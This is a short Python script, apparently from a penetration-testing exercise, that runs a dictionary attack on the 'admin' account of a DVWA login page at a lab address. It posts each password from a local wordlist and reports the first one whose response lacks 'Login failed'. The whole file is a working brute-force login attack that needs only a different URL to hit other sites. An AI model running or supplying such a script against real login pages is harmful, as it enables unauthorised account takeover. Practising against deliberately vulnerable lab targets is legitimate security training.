import requests

target_url = 'http://10.0.2.7/dvwa/login.php'
#data_dict = {'username': 'blahblah', 'password': 'blahblah', 'Login': 'submit'}
data_dict = {'username': 'admin', 'password': '', 'Login': 'submit'}


with open('/root/Downloads/passwords.txt', 'r') as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dict['password'] = word
        response = requests.post(target_url, data=data_dict)
        if 'Login failed' not in response.content.decode('utf-8'):
            print('[+] Got the password --> ' + word)
            exit()

print('[+] Reached end of file.')
